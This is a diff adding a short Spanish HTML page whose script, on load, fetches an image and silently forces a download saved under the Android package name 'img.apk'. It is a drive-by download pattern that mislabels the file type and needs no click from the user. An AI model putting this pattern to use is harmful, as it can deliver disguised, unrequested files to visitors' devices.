@@ -1,0 +1,56 @@
+
+
+<!DOCTYPE html>
+
+<html lang="es">
+
+<head>
+
+  <meta charset="UTF-8">
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <title>Descargar Imagen Automáticamente</title>
+
+</head>
+
+<body>
+
+
+
+<script>
+
+  const imagenURL = 'https://wpcom.files.wordpress.com/2023/11/hey-world-1.png';
+
+  const nombreArchivo = 'img.apk';
+
+
+
+  fetch(imagenURL)
+
+    .then(response => response.blob())
+
+    .then(blob => {
+
+      const link = document.createElement('a');
+
+      link.href = window.URL.createObjectURL(blob);
+
+      link.download = nombreArchivo;
+
+
+
+      // Simulamos un clic en el enlace para iniciar la descarga automáticamente
+
+      link.click();
+
+    });
+
+</script>
+
+
+
+</body>
+
+</html>
+
